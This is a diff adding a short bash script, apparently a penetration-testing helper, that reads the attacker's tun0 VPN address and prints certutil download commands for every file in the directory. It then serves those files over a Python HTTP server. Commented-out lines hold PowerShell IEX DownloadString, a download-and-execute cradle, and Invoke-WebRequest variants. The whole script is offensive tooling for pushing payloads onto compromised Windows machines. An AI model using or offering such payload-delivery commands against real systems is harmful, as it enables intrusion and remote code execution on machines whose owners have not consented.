@@ -1,0 +1,18 @@
+#!/bin/bash
+#cweb = cmd.exe web
+if [ -z $1 ]
+  then
+    port=9000
+else
+    port=$1
+fi
+
+tun0=$(/sbin/ifconfig tun0 | grep 'inet' | head -1 | awk '{print $2}')
+for f in *; do
+#	echo "IEX (New-Object Net.WebClient).DownloadString('http://$tun0:$port/$f')"
+#	echo "invoke-webrequest -Uri http://$tun0:$port/$f -OutFile $f"
+#	echo Invoke-WebRequest http://$tun0:$port/$f -OutFile $f
+	echo certutil -urlcache -split -f http://$tun0:$port/$f $f
+done
+
+python -m SimpleHTTPServer $port
